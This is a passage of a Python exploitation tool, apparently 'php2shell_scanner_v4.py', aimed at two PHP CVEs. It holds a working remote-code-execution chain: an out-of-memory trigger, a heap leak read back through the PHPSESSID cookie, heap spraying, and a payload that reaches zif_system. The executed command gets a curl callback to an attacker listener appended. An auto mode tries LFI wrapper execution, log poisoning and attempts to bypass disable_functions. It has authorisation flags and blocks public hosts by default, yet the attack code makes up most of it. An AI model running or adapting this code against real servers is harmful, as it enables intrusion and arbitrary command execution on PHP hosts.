    total_attempts = max(max_attempts, len(candidates))

    try:
        import urllib.parse

        for attempt in range(total_attempts):
            cand_idx = attempt % len(candidates)
            profile_key, offsets, match_tier = candidates[cand_idx]
            spray = SPRAY_CONFIGS[min(attempt, len(SPRAY_CONFIGS) - 1)]
            session_id = f"{'A' * 26}{attempt:02d}"

            if attempt > 0:
                result["notes"].append(
                    f"--- attempt {attempt + 1}/{total_attempts} "
                    f"profile={profile_key} ({match_tier}), "
                    f"spray: parts={spray['parts']}, depth={spray['depth']} ---"
                )
            else:
                result["notes"].append(f"using profile: {profile_key} ({match_tier})")

            # --- A1: trigger OOM to get dangling PS(id) ---
            result["notes"].append("A1: sending OOM trigger")
            a1_body = build_oom_probe_body()
            a1_headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={session_id}",
            }
            try:
                a1_exchange = client.request(
                    "POST", profile.base_url,
                    body=a1_body, headers=a1_headers,
                    chunked=True, nonce=new_nonce("P2SDA1"), timeout=timeout,
                )
                a1_class = classify(a1_exchange, nonce="")
                a1_item = store.add_http(
                    a1_exchange, a1_class,
                    scenario_id="chain-d-a1-oom",
                    trust="medium",
                    notes=f"Chain D A1: OOM trigger (attempt {attempt + 1})",
                )
                result["request_refs"].append(a1_item.id)
                if a1_exchange.status not in (500, 502):
                    result["notes"].append(f"A1 unexpected status: {a1_exchange.status}")
            except Exception as e:
                result["notes"].append(f"A1 failed: {e}")
                continue

            # --- B1: read back heap leak via PHPSESSID cookie ---
            result["notes"].append("B1: reading heap leak")
            b1_headers = {"Cookie": f"PHPSESSID={session_id}"}
            try:
                b1_exchange = client.request(
                    "GET", profile.base_url,
                    headers=b1_headers,
                    nonce=new_nonce("P2SDB1"), timeout=timeout,
                )
                b1_class = classify(b1_exchange, nonce="")
                b1_item = store.add_http(
                    b1_exchange, b1_class,
                    scenario_id="chain-d-b1-leak",
                    trust="medium",
                    notes=f"Chain D B1: heap leak (attempt {attempt + 1})",
                )
                result["request_refs"].append(b1_item.id)
            except Exception as e:
                result["notes"].append(f"B1 failed: {e}")
                continue

            # Extract PHPSESSID from Set-Cookie
            set_cookie = ""
            hdrs = b1_exchange.response_headers or {}
            for hdr_name, hdr_val in (hdrs.items() if isinstance(hdrs, dict) else hdrs):
                if hdr_name.lower() == "set-cookie" and "PHPSESSID=" in hdr_val:
                    set_cookie = hdr_val
                    break

            if not set_cookie:
                result["notes"].append("B1: no PHPSESSID in Set-Cookie — leak failed")
                continue

            cookie_parts = set_cookie.split(";")[0]
            if "=" not in cookie_parts:
                result["notes"].append("B1: malformed Set-Cookie")
                continue
            raw_session = cookie_parts.split("=", 1)[1]

            try:
                leaked_bytes = urllib.parse.unquote_to_bytes(raw_session)
            except Exception:
                leaked_bytes = raw_session.encode("latin-1")

            result["notes"].append(f"B1: got {len(leaked_bytes)} bytes from session cookie")

            if len(leaked_bytes) < 100:
                result["notes"].append("B1: leak too small — retrying with different session")
                continue

            leak = _parse_heap_leak(leaked_bytes)
            if not leak:
                result["notes"].append("B1: failed to parse heap layout from leak")
                continue

            result["leak_info"] = leak
            result["notes"].append(
                f"B1: libphp base=0x{leak['libphp_base']:x}, "
                f"ptrs={leak['pointer_count']}, bases={leak['unique_bases']}"
            )

            if leak["main_chunk_base"] is None:
                result["notes"].append("B1: could not determine main chunk base — retrying")
                continue

            result["notes"].append(f"B1: main chunk base=0x{leak['main_chunk_base']:x}")

            # --- A2: cheap OOM to prepare heap for payload ---
            result["notes"].append(
                f"A2: heap spray (parts={spray['parts']}, depth={spray['depth']})"
            )
            a2_body = build_oom_lite_body(
                parts=spray["parts"], depth=spray["depth"],
            )
            a2_headers = {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={urllib.parse.quote(raw_session, safe='')}",
            }
            try:
                a2_exchange = client.request(
                    "POST", profile.base_url,
                    body=a2_body, headers=a2_headers,
                    chunked=True, nonce=new_nonce("P2SDA2"), timeout=timeout,
                )
                a2_class = classify(a2_exchange, nonce="")
                a2_item = store.add_http(
                    a2_exchange, a2_class,
                    scenario_id="chain-d-a2-prep",
                    trust="medium",
                    notes=f"Chain D A2: heap spray (attempt {attempt + 1})",
                )
                result["request_refs"].append(a2_item.id)
            except Exception as e:
                result["notes"].append(f"A2 failed: {e}")
                continue

            # --- B2: send payload with fake zend_array → zif_system ---
            if listener:
                callback_url = listener.callback_url(canary_nonce)
                full_cmd = f"{command}; curl -s {callback_url} >/dev/null 2>&1"
            else:
                full_cmd = command

            result["notes"].append(f"B2: sending RCE payload (cmd: {command})")
            payload = _build_chain_d_payload(
                full_cmd, offsets, leak["libphp_base"], leak["main_chunk_base"],
            )

            b2_boundary = "B" * 10
            b2_body = bytearray()
            b2_body.extend(f"--{b2_boundary}\r\n".encode())
            b2_body.extend(
                b"Content-Disposition: form-data; "
                b"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
            )
            b2_body.extend(payload)
            b2_body.extend(b"\r\n")
            # Extra heap spray padding in B2 to improve placement reliability
            for i in range(spray["pad_blocks"]):
                b2_body.extend(f"--{b2_boundary}\r\n".encode())
                b2_body.extend(
                    f"Content-Disposition: form-data; name=\"pad{i:04d}\"\r\n\r\n".encode()
                )
                b2_body.extend(b"P" * spray["pad_size"] + b"\r\n")
            b2_body.extend(f"--{b2_boundary}--\r\n".encode())

            b2_headers = {
                "Content-Type": f"multipart/form-data; boundary={b2_boundary}",
                "Cookie": f"PHPSESSID={urllib.parse.quote(raw_session, safe='')}",
            }
            try:
                b2_exchange = client.request(
                    "POST", profile.base_url,
                    body=bytes(b2_body), headers=b2_headers,
                    chunked=True, nonce=new_nonce("P2SDB2"), timeout=timeout,
                )
                b2_class = classify(b2_exchange, nonce="")
                b2_item = store.add_http(
                    b2_exchange, b2_class,
                    scenario_id="chain-d-b2-rce",
                    trust="medium",
                    notes=f"Chain D B2: RCE payload (attempt {attempt + 1})",
                )
                result["request_refs"].append(b2_item.id)
            except Exception as e:
                result["notes"].append(f"B2 failed: {e}")
                continue

            body_text = _body_text(b2_exchange)

            if listener:
                cb = listener.wait_for_callback(canary_nonce, timeout=8.0)
                if cb:
                    result["callback_received"] = True
                    result["success"] = True
                    result["notes"].append(
                        f"callback confirmed RCE via Chain D (attempt {attempt + 1})"
                    )
                    break

            if body_text:
                result["output"] = body_text[:2000]
                if body_text.strip():
                    result["notes"].append(
                        f"B2 produced output (attempt {attempt + 1}, "
                        f"unverified without callback)"
                    )
                    if not listener:
                        result["success"] = True
                        result["notes"].append(
                            "marking success (no listener configured; "
                            "output-only verification)"
                        )
                        break

            if not result["success"]:
                result["notes"].append(
                    f"attempt {attempt + 1} did not confirm RCE"
                )

        if not result["success"]:
            result["notes"].append(
                f"all {total_attempts} attempts ({len(candidates)} profiles) exhausted without confirmed RCE"
            )

    finally:
        release_workers(holders)

    return result


def _run_auto(args: argparse.Namespace) -> int:
    if not args.ack_authorised:
        _abort(
            "auto requires --ack-authorised: this may send exploit payloads to the target"
        )
    target_host = urlsplit(args.target).hostname or ""
    if not args.allow_remote and _public_host(target_host):
        _abort(
            f"refusing to scan public host {target_host!r}; "
            "use --allow-remote only with explicit written authorisation"
        )
    if args.skip_discovery and not args.lfi_path:
        _abort("--skip-discovery requires --lfi-path")

    outdir = args.out or _default_out("auto", args.target)
    run_id = os.path.basename(outdir.rstrip("/\\"))
    store = RunStore(outdir, run_id, args.target, "auto", VERSION)
    previous_runs = _existing_runs(store)
    client = _client(args)

    print(f"  target: {args.target}")
    print(f"  output: {outdir}")

    # --- Inventory + Probe ---
    print("\n  [1/6] inventory")
    profile = collect(
        args.target, client, _inventory_options(args), store=store, run_id=run_id,
    )
    print(f"    php: {profile.php_version or 'unknown'}, sapi: {profile.sapi}")

    print("  [2/6] probe")
    probe_result = run_probe(client, profile, store, status_url=args.status_url, timeout=args.probe_timeout)
    print(f"    reach: {probe_result.reach}")
    if probe_result.reach == "BLOCKED":
        print("    ! frontend blocked multipart; exploit chains will not work")
        # Still continue — discovery may reveal other info

    # --- Discovery ---
    discover_result = None
    if not args.skip_discovery:
        print("  [3/6] discovery")

        def _log(msg: str) -> None:
            print(f"    {msg}")

        discover_result = run_discovery(
            client, profile, store,
            max_requests=args.max_discover_requests,
            timeout=args.timeout,
            log=_log,
        )
    else:
        print("  [3/6] discovery (skipped)")

    # --- Resolve exploit prerequisites ---
    lfi_path = args.lfi_path
    session_path = args.session_path or "/tmp/sess_"

    if discover_result and not lfi_path:
        best = discover_result.best_lfi()
        if best:
            parsed = urlsplit(best.url)
            lfi_path = f"{parsed.path}?{best.param}="
            print(f"    resolved lfi_path: {lfi_path} (method: {best.method})")

    if discover_result and not args.session_path:
        if discover_result.session_path:
            session_path = discover_result.session_path
            print(f"    resolved session_path: {session_path}")

    # --- Determine which chains to try ---
    chains_to_try: List[str] = []
    wrapper_mode = None
    log_poison_path = None

    if discover_result and discover_result.wrapper_works:
        wrapper_mode = discover_result.wrapper_works
        print(f"\n    ! PHP wrapper execution available ({wrapper_mode}://)")
        print("      direct code execution possible without session injection")

    if discover_result and discover_result.log_poisoning_path:
        log_poison_path = discover_result.log_poisoning_path
        print(f"\n    ! log poisoning available: {log_poison_path}")

    # Upload progress warnings
    if discover_result and discover_result.phpinfo.found:
        if discover_result.phpinfo.upload_progress_cleanup is True:
            print("    ! session.upload_progress.cleanup=On — chain A race window is narrow")
        if discover_result.phpinfo.upload_progress_enabled is False:
            print("    ! session.upload_progress.enabled=Off — session injection will not work")

    # Chain D detection
    chain_d_ready = (discover_result and getattr(discover_result, "chain_d_ready", False))
    if chain_d_ready:
        print("\n    ! OOM + mod_php detected — Chain D (pure OOM RCE) available")

    # Wrapper RCE comes first (simplest), then log poisoning, then standard chains,
    # then Chain D (OOM-only, no LFI), then gadget chain B
    if wrapper_mode and discover_result:
        chains_to_try.append("WRAPPER")
    if log_poison_path and discover_result:
        chains_to_try.append("LOG_POISON")
    if lfi_path:
        chains_to_try.append("A")
        if args.callback_port is not None:
            chains_to_try.append("C")
    if chain_d_ready:
        chains_to_try.append("D")
    if args.gadget:
        chains_to_try.append("B")

    if not chains_to_try:
        print("\n  [!] no viable exploit path found:")
        if not lfi_path:
            print("      - no LFI discovered (try --lfi-path if you know one)")
        if not args.gadget:
            print("      - no gadget provided for chain B (try --gadget)")
        if not args.callback_port:
            print("      - no callback port (add --callback-port for chain C)")

        environment = {
            "kind": args.environment_kind,
            "mode": "auto",
            "probe": probe_result.to_dict(),
            "discovery": discover_result.to_dict() if discover_result else {},
            "chains_attempted": [],
            "started_at": utcnow(),
        }
        case = _case(run_id, profile, store.load_evidence(), previous_runs, "auto", environment)
        findings = assess_all(case)
        return _finalise(store, case, findings, outdir, args.json)

    # --- Start callback listener (shared across all chains) ---
    listener: Optional[CallbackListener] = None
    if args.callback_port is not None:
        try:
            listener = CallbackListener(
                port=args.callback_port,
                bind=args.callback_bind,
                target_host=urlsplit(args.target).hostname or "",
                target_port=urlsplit(args.target).port or 80,
            )
            if args.callback_ip:
                listener.local_ip = args.callback_ip
            listener.start()
        except OSError as exc:
            print(f"    ! callback listener failed: {exc}")
            listener = None

    # --- Execute chains ---
    all_runs: List[ScenarioRun] = list(previous_runs)
    chain_results: List[Dict[str, Any]] = []
    rce_confirmed = False
    best_exploit_result = None

    started_at = time.monotonic()

    for chain in chains_to_try:
        if rce_confirmed:
            break
        elapsed = time.monotonic() - started_at
        if elapsed > args.max_seconds:
            print(f"\n  [!] wall-clock budget exhausted ({elapsed:.0f}s)")
            break

        step = 4 + chains_to_try.index(chain)
        total = 3 + len(chains_to_try) + 1
        print(f"\n  [{step}/{total}] exploit: {chain}")

        # --- Wrapper RCE (data:// or php://input) ---
        if chain == "WRAPPER" and discover_result:
            best_lfi = discover_result.best_lfi()
            if best_lfi and wrapper_mode:
                canary = new_nonce("P2SAUTO")
                wr = _try_wrapper_rce(
                    client, profile, store, best_lfi, wrapper_mode,
                    args.command, args.exec_func, listener, canary, args.timeout,
                )
                chain_entry = {
                    "chain": f"WRAPPER-{wrapper_mode}",
                    "rce_confirmed": wr["success"],
                    "callback_received": wr["callback_received"],
                    "response_markers_seen": wr.get("output") is not None,
                    "errors": [],
                    "notes": wr["notes"],
                }
                chain_results.append(chain_entry)
                if wr["success"]:
                    rce_confirmed = True
                    print(f"    [RCE CONFIRMED] via {wrapper_mode}:// wrapper")
                    if wr["output"]:
                        for line in wr["output"].strip().splitlines():
                            print(f"      | {line}")
                elif wr["output"]:
                    print(f"    [UNVERIFIED OUTPUT] via {wrapper_mode}://")
                    for line in wr["output"].strip().splitlines():
                        print(f"      | {line}")
                else:
                    print(f"    wrapper {wrapper_mode}://: {wr['notes'][-1] if wr['notes'] else 'failed'}")
            continue

        # --- Log poisoning RCE ---
        if chain == "LOG_POISON" and discover_result and log_poison_path:
            best_lfi = discover_result.best_lfi()
            if best_lfi:
                canary = new_nonce("P2SAUTO")
                lr = _try_log_poison_rce(
                    client, profile, store, best_lfi, log_poison_path,
                    args.command, args.exec_func, listener, canary, args.timeout,
                )
                chain_entry = {
                    "chain": "LOG_POISON",
                    "rce_confirmed": lr["success"],
                    "callback_received": lr["callback_received"],
                    "response_markers_seen": lr.get("output") is not None,
                    "errors": [],
                    "notes": lr["notes"],
                }
                chain_results.append(chain_entry)
                if lr["success"]:
                    rce_confirmed = True
                    print(f"    [RCE CONFIRMED] via log poisoning ({log_poison_path})")
                    if lr["output"]:
                        for line in lr["output"].strip().splitlines():
                            print(f"      | {line}")
                elif lr["output"]:
                    print(f"    [UNVERIFIED OUTPUT] via log poisoning")
                else:
                    print(f"    log poisoning: {lr['notes'][-1] if lr['notes'] else 'failed'}")
            continue

        # --- Chain D: pure OOM mod_php (no LFI needed) ---
        if chain == "D" and chain_d_ready:
            canary = new_nonce("P2SAUTO")
            dr = _try_chain_d_rce(
                client, profile, store,
                args.command, listener, canary, args.timeout,
                chain_d_offsets_path=getattr(args, "chain_d_offsets", None),
            )
            chain_entry = {
                "chain": "D",
                "rce_confirmed": dr["success"],
                "callback_received": dr["callback_received"],
                "response_markers_seen": dr.get("output") is not None,
                "errors": [],
                "notes": dr["notes"],
                "leak_info": dr.get("leak_info"),
            }
            chain_results.append(chain_entry)
            if dr["success"]:
                rce_confirmed = True
                print(f"    [RCE CONFIRMED] Chain D: pure OOM exploitation")
                if dr["output"]:
                    for line in dr["output"].strip().splitlines()[:10]:
                        print(f"      | {line}")
            elif dr["output"]:
                print(f"    [UNVERIFIED OUTPUT] Chain D")
                for line in dr["output"].strip().splitlines()[:5]:
                    print(f"      | {line}")
            else:
                print(f"    Chain D: {dr['notes'][-1] if dr['notes'] else 'failed'}")
                for note in dr["notes"]:
                    print(f"      . {note}")
            continue

        # --- Standard chains A/B/C ---
        budget = ExploitBudget(
            max_requests=args.max_exploit_requests,
            max_bytes=args.max_bytes,
            max_seconds=max(10.0, args.max_seconds - elapsed),
            started_at=time.monotonic(),
        )

        options = ExploitOptions(
            chain=chain,
            lfi_path=lfi_path if chain in ("A", "C") else None,
            session_path=session_path,
            inject_path="/index.php",
            command=args.command,
            exec_func=args.exec_func,
            gadget=args.gadget if chain == "B" else None,
            canary_nonce=args.canary_nonce if chain == "B" else None,
            callback_port=args.callback_port,
            callback_bind=args.callback_bind,
            callback_ip=args.callback_ip,
            callback_expect=list(args.callback_expect or []),
            attempts=args.attempts,
            race_delay=args.race_delay,
            timeout=args.timeout,
            acknowledge_authorised=True,
            environment_kind=args.environment_kind,
            insecure=args.insecure,
            ca_file=args.ca_file,
            extra_headers=_parse_headers(args.header),
            host_header=args.host_header,
            max_body=args.max_body,
            health_url=args.health_url,
            budget=budget,
        )

        exploit_result = run_exploit(client, profile, store, options)

        chain_entry = {
            "chain": chain,
            "rce_confirmed": exploit_result.rce_confirmed,
            "callback_received": exploit_result.callback_received,
            "response_markers_seen": exploit_result.response_markers_seen,
            "errors": list(exploit_result.errors),
            "attempts": exploit_result.attempts,
            "requests": budget.requests,
        }
        chain_results.append(chain_entry)

        if exploit_result.scenario_run:
            telemetry_refs = _ingest_telemetry(
                store, list(args.telemetry or []),
                args.telemetry_source,
                exploit_result.scenario_id,
                bool(args.synthetic_fixture),
            )
            if telemetry_refs:
                exploit_result.scenario_run.telemetry_refs.extend(telemetry_refs)
            all_runs.append(exploit_result.scenario_run)

        if exploit_result.rce_confirmed:
            rce_confirmed = True
            best_exploit_result = exploit_result
            print(f"    [RCE CONFIRMED] chain {chain}")
            if exploit_result.command_output:
                for line in exploit_result.command_output.strip().splitlines():
                    print(f"      | {line}")
        elif exploit_result.command_output:
            print(f"    [UNVERIFIED OUTPUT] chain {chain}")
            if not best_exploit_result:
                best_exploit_result = exploit_result
        else:
            reasons = exploit_result.errors or ["no output"]
            print(f"    chain {chain}: {reasons[0]}")

    # --- Clean up listener ---
    if listener is not None:
        listener.stop()

    # --- Finalize ---
    step_final = 4 + len(chains_to_try)
    total_final = step_final
    print(f"\n  [{step_final}/{total_final}] report")

    environment = {
        "kind": args.environment_kind,
        "mode": "auto",
        "probe": probe_result.to_dict(),
        "discovery": discover_result.to_dict() if discover_result else {},
        "chains_attempted": chain_results,
        "started_at": utcnow(),
        "rce_confirmed": rce_confirmed,
    }
    if best_exploit_result:
        environment["exploit"] = best_exploit_result.to_dict()
        environment["degraded"] = best_exploit_result.degraded

    case = _case(run_id, profile, store.load_evidence(), all_runs, "auto", environment)
    findings = assess_all(case)

    exploit_assessment: Dict[str, Any] = {}
    if best_exploit_result:
        exploit_assessment = assess_exploit(case)
        case.environment["exploit_assessment"] = exploit_assessment

    rc = _finalise(
        store, case, findings, outdir, args.json,
        exploit_result=best_exploit_result,
        exploit_assessment=exploit_assessment or None,
        exploit_confirmed=rce_confirmed,
    )

    if not args.json:
        print(f"\n  === AUTO SUMMARY ===")
        print(f"  target        : {args.target}")
        if discover_result:
            print(f"  phpinfo       : {'found' if discover_result.phpinfo.found else 'not found'}")
            print(f"  LFI           : {lfi_path or 'not found'}")
            print(f"  session path  : {session_path}")
            if discover_result.framework:
                print(f"  framework     : {discover_result.framework}")
            if discover_result.wrapper_works:
                print(f"  wrapper       : {discover_result.wrapper_works}://")
            if discover_result.log_poisoning_path:
                print(f"  log poison    : {discover_result.log_poisoning_path}")
        print(f"  chains tried  : {', '.join(c['chain'] for c in chain_results) or 'none'}")
        if rce_confirmed:
            print(f"  result        : RCE CONFIRMED")
            if best_exploit_result and best_exploit_result.command_output:
                print(f"  command output :")
                for line in best_exploit_result.command_output.strip().splitlines():
                    print(f"    | {line}")
        else:
            print(f"  result        : no confirmed RCE")
        print(f"  evidence      : {outdir}")

    return rc


def _run_report(args: argparse.Namespace) -> int:
    source = os.path.abspath(args.evidence_dir)
    store = RunStore.open(source)
    case = store.read_case()
    # Rebuild the case from the saved profile/runs and the stored evidence.
    case.mode = "report"
    case.finished_at = utcnow()
    findings = assess_all(case)
    assessment = assess_exploit(case)
    outdir = args.out or os.path.join(source, "report")
    verification_errors = store.verify() + case.validate()
    for finding in findings:
        verification_errors.extend(finding.validate())
    doc = build_document(case, findings, verification_errors)
    paths = write_reports(outdir, doc, findings)
    payload = {
        "target": case.profile.target,
        "run_id": case.run_id,
        "mode": "report",
        "verdicts": {f.cve: {"status": f.status, "reason": f.status_reason} for f in findings},
        "exploit_assessment": assessment,
        "files": paths,
        "integrity_ok": not verification_errors,
        "errors": verification_errors,
    }
    if args.json:
        print(json.dumps(payload, indent=2, ensure_ascii=False))
    else:
        print(f"rebuilt report from {source} without network requests")
        for finding in findings:
            print(f"  {finding.cve}  {finding.status:32s} {finding.status_reason}")
        print(f"  exploit      {'RCE OBSERVED' if assessment.get('confirmed') else 'NOT CONFIRMED'}"
              f" (attribution: {assessment.get('attribution')})")
        print(f"files: {outdir}")
    if verification_errors:
        return 2
    if assessment.get("confirmed"):
        return 1
    if any(f.status in PROOF_STATUSES for f in findings):
        return 1
    return 0


def _run_verify(args: argparse.Namespace) -> int:
    store = RunStore.open(os.path.abspath(args.evidence_dir))
    errors = store.verify()
    case = store.read_case()
    errors.extend(case.validate())
    if args.json:
        print(json.dumps({"ok": not errors, "errors": errors}, indent=2, ensure_ascii=False))
    else:
        print("PASS" if not errors else "FAIL")
        for error in errors:
            print(f"  - {error}")
    return 0 if not errors else 2


def _attempts_type(value: str) -> int:
    try:
        number = int(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("must be an integer") from exc
    if not 1 <= number <= MAX_ATTEMPTS:
        raise argparse.ArgumentTypeError(
            f"must be between 1 and {MAX_ATTEMPTS}"
        )
    return number


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="php2shell_scanner_v4.py",
        description=(
            "Evidence-first exposure scanner for CVE-2026-109618 and CVE-2026-109619. "
            "Modes: inventory, probe, prove, exploit, report, verify."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # 1. inventory only (GET, no OOM)
  python php2shell_scanner_v4.py inventory https://target --out runs/t1

  # 2. low-impact reachability probe (no OOM)
  python php2shell_scanner_v4.py probe https://target --out runs/t1

  # 3. bounded proof run against a prepared internal lab
  python php2shell_scanner_v4.py prove http://127.0.0.1:8080 \\
      --scenario 618-S2 --ack-authorised \\
      --telemetry /var/log/php/error.log --telemetry /var/log/nginx/error.log \\
      --status-url http://127.0.0.1:8080/status.php \\
      --health-url http://127.0.0.1:8080/status.php \\
      --out runs/lab-618

  # 4. rebuild the report from evidence (no network)
  python php2shell_scanner_v4.py report runs/lab-618 --out runs/lab-618/report

  # 5. verify artefact hashes
  python php2shell_scanner_v4.py verify runs/lab-618
""",
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    def common(p: argparse.ArgumentParser) -> None:
        p.add_argument("--out", help="evidence/run directory")
        p.add_argument("--json", action="store_true", help="machine-readable stdout summary")
        p.add_argument("--timeout", type=float, default=10.0, help="per-request timeout (seconds)")
        p.add_argument("--probe-timeout", type=float, default=30.0, help="probe/health timeout (seconds)")
        p.add_argument("--max-body", type=int, default=262144, help="max response bytes stored")
        p.add_argument("--insecure", action="store_true", help="disable TLS verification (explicit opt-in)")
        p.add_argument("--ca-file", help="custom CA bundle")
        p.add_argument("--header", action="append", help="extra request header 'Name: value' (repeatable)")
        p.add_argument("--host-header", help="override the HTTP Host header")
        p.add_argument("--proxy", help="HTTP proxy URL")
        p.add_argument("--no-redirects", action="store_true", help="do not follow redirects")
        p.add_argument("--inventory-json", help="operator inventory JSON (build/package/backports)")
        p.add_argument("--php-binary", help="local php binary used for a host inventory probe")
        p.add_argument("--status-url", help="lab status endpoint returning sapi/worker/request id JSON")
        p.add_argument("--sapi", default="auto",
                       choices=("auto", "mod_php", "fpm", "frankenphp", "lsapi", "cli-server", "cgi-fcgi", "unknown"),
                       help="declared SAPI; auto stays UNKNOWN without a verified source")
        p.add_argument("--environment-kind", default="remote",
                       choices=("remote", "lab", "fixture"), help="provenance label")
        p.add_argument("--telemetry", action="append", help="imported log/trace file (repeatable)")
        p.add_argument("--telemetry-source", help="force source for imported telemetry")
        p.add_argument("--synthetic-fixture", action="store_true",
                       help="mark all evidence as synthetic; never allows confirmed statuses")
        p.add_argument("--all", action="store_true",
                       help="inventory/probe: run all low-impact checks; never enables prove")

    inv = sub.add_parser("inventory", help="build/package/SAPI inventory (GET only)")
    inv.add_argument("target")
    common(inv)

    probe = sub.add_parser("probe", help="low-impact frontend -> PHP reachability probes")
    probe.add_argument("target")
    common(probe)

    prove = sub.add_parser("prove", help="bounded scenario execution (explicit authorisation)")
    prove.add_argument("target")
    common(prove)
    prove.add_argument("--scenario", action="append", help="scenario id, e.g. 618-S2 or 619-S2 (repeatable)")
    prove.add_argument("--ack-authorised", action="store_true",
                       help="confirm written authorisation for the internal target")
    prove.add_argument("--health-url", help="health check URL (default: target)")
    prove.add_argument("--max-requests", type=int, default=8)
    prove.add_argument("--max-bytes", type=int, default=32 * 1024 * 1024)
    prove.add_argument("--max-request-bytes", type=int, default=8 * 1024 * 1024)
    prove.add_argument("--max-seconds", type=float, default=180.0)
    prove.add_argument("--concurrency", type=int, default=1,
                       help="must be 1: worker correlation requires sequential requests")
    prove.add_argument("--producer-url", help="lab harness producer endpoint")
    prove.add_argument("--consumer-url", help="lab harness consumer endpoint")
    prove.add_argument("--app-oom-endpoint", help="application fixture endpoint for 618-S4")
    prove.add_argument("--app-oom-field", help="multipart field consumed by the 618-S4 fixture")
    prove.add_argument("--app-oom-mib", type=int, default=8)
    prove.add_argument("--canary-readback-url", help="independent canary readback endpoint")
    prove.add_argument("--allow-rerun", action="store_true",
                       help="allow a scenario id to run again in the same evidence set")
    prove.add_argument("--allow-non-advisory-sapi", action="store_true",
                       help="run OOM diagnostics on a SAPI the advisory did not evaluate")

    exploit = sub.add_parser("exploit", help="exploit chains with RCE verification (requires --ack-authorised)")
    exploit.add_argument("target")
    common(exploit)
    exploit.add_argument("--chain", default="A", choices=("A", "B", "C", "D"),
                         help="exploit chain: A=session+LFI, B=gadget deser, C=direct callback, D=pure OOM mod_php")
    exploit.add_argument("--cve", choices=(CVE_618, CVE_619),
                         help="CVE label for the run (default: chain-specific)")
    exploit.add_argument("--ack-authorised", action="store_true",
                         help="confirm written authorisation for exploit execution")
    exploit.add_argument("--lfi-path", help="LFI path (e.g. /page.php?page=)")
    exploit.add_argument("--session-path", default="/tmp/sessions/sess_",
                         help="PHP session file prefix; must match session.save_path")
    exploit.add_argument("--inject-path", default="/index.php",
                         help="path for session injection POST")
    exploit.add_argument("--trigger-path", help="path for gadget trigger (chain B)")
    exploit.add_argument("--command", default="id", help="command to execute on target")
    exploit.add_argument("--exec-func", default=None,
                         choices=("system", "passthru", "shell_exec", "exec", "popen", "proc_open"),
                         help="preferred PHP execution function (the scanner tries all "
                              "functions automatically to bypass disable_functions; this "
                              "sets which one to try first)")
    exploit.add_argument("--gadget", help="serialised POP chain required by chain B")
    exploit.add_argument("--canary-nonce",
                         help="chain B only: nonce to embed in the operator's gadget "
                              "so its callback can be correlated (P2S[A-Z0-9]{6,64}; "
                              "use a fresh value per run)")
    exploit.add_argument("--callback-port", type=int, default=None,
                         help="callback listener port (omit to disable, 0=auto)")
    exploit.add_argument("--callback-bind", default="0.0.0.0",
                         help="callback listener bind address")
    exploit.add_argument("--callback-ip", help="IP the target should call back to (auto-detected if omitted)")
    exploit.add_argument("--callback-expect", action="append",
                         help="source IP the callback is expected from (repeatable; "
                              "useful behind NAT)")
    exploit.add_argument("--attempts", type=_attempts_type, default=5,
                         help=f"number of exploit attempts (1..{MAX_ATTEMPTS})")
    exploit.add_argument("--race-delay", type=float, default=0.05,
                         help="upload-progress stall delay for chain A (0 disables; "
                              "skipped automatically on single-threaded cli-server)")
    exploit.add_argument("--max-requests", type=int, default=40,
                         help="request budget for the exploit chain (health/probe excluded)")
    exploit.add_argument("--max-bytes", type=int, default=32 * 1024 * 1024,
                         help="sent+received byte budget for the exploit chain")
    exploit.add_argument("--max-seconds", type=float, default=120.0,
                         help="wall-clock budget for the exploit chain")
    exploit.add_argument("--health-url", help="health check URL (default: target base URL)")
    exploit.add_argument("--allow-remote", action="store_true",
                         help="allow exploit payloads against a globally routable host")
    exploit.add_argument("--chain-d-offsets", metavar="FILE",
                         help="JSON file with Chain D offset profiles (default: bundled data/chain_d_offsets.json)")

    auto = sub.add_parser("auto", help="discover prerequisites and try all viable chains")
    auto.add_argument("target")
    common(auto)
    auto.add_argument("--ack-authorised", action="store_true",
                      help="confirm written authorisation for exploit execution")
    auto.add_argument("--allow-remote", action="store_true",
                      help="allow exploit payloads against a globally routable host")
    auto.add_argument("--command", default="id", help="command to execute on target")
    auto.add_argument("--exec-func", default=None,
                      choices=("system", "passthru", "shell_exec", "exec", "popen", "proc_open"),
                      help="preferred PHP execution function")
    auto.add_argument("--callback-port", type=int, default=None,
                      help="callback listener port (strongly recommended; omit to skip callback)")
    auto.add_argument("--callback-bind", default="0.0.0.0",
                      help="callback listener bind address")
    auto.add_argument("--callback-ip",
                      help="IP the target should call back to (auto-detected if omitted)")
    auto.add_argument("--callback-expect", action="append",
                      help="source IP the callback is expected from (repeatable)")
    auto.add_argument("--attempts", type=_attempts_type, default=5,
                      help=f"number of exploit attempts per chain (1..{MAX_ATTEMPTS})")
    auto.add_argument("--race-delay", type=float, default=0.05,
                      help="upload-progress stall delay for chain A")
    auto.add_argument("--max-discover-requests", type=int, default=120,
                      help="request budget for the discovery phase")
    auto.add_argument("--max-exploit-requests", type=int, default=60,
                      help="request budget per exploit chain")
    auto.add_argument("--max-bytes", type=int, default=64 * 1024 * 1024,
                      help="sent+received byte budget for exploit chains")
    auto.add_argument("--max-seconds", type=float, default=300.0,
                      help="wall-clock budget for the entire auto run")
    auto.add_argument("--health-url", help="health check URL (default: target base URL)")
    auto.add_argument("--lfi-path",
                      help="skip LFI discovery and use this path directly")
    auto.add_argument("--session-path",
                      help="skip session path discovery and use this path directly")
    auto.add_argument("--gadget",
                      help="serialised POP chain for chain B (optional)")
    auto.add_argument("--canary-nonce",
                      help="chain B only: nonce embedded in the operator's gadget")
    auto.add_argument("--skip-discovery", action="store_true",
                      help="skip discovery phases; requires --lfi-path")
    auto.add_argument("--chain-d-offsets", metavar="FILE",
                      help="JSON file with Chain D offset profiles (default: bundled data/chain_d_offsets.json)")

    report = sub.add_parser("report", help="rebuild findings from stored evidence (no network)")
    report.add_argument("evidence_dir")
    report.add_argument("--out", help="report output directory")
    report.add_argument("--json", action="store_true")

    verify = sub.add_parser("verify", help="verify evidence artefact hashes")
    verify.add_argument("evidence_dir")
    verify.add_argument("--json", action="store_true")

    return parser


def main(argv: Optional[List[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
